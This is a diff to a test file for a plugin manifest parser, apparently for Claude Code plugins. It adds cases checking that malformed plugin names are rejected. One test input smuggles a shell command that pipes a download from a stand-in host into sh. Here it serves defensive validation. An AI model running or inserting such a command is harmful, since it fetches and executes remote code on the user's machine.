@@ -147,9 +147,20 @@ describe('parseManifest', () => {
     expect(() => parseManifest(JSON.stringify(manifest))).not.toThrow(char)
   })
 
+  it.each([
+    'x;curl -s evil.example|sh',
+    'my meter',
+    '-meter',
+    '.meter',
+  ])('refuses a name outside Claude Code’s plugin id rule: %j', (name) => {
+    expect(() => parseManifest(JSON.stringify({ name }))).toThrow(
+      /name must start with a letter or digit/,
+    )
+  })
+
   it('keeps ordinary spaces and printable unicode', () => {
     const manifest = {
-      name: 'skins für Claude',
+      name: 'skins-fur-claude',
       version: '1.0.0 β',
       description: 'Reskins it 🎨 — 日本語 and Ünïcödé, tabs aside.',
     }
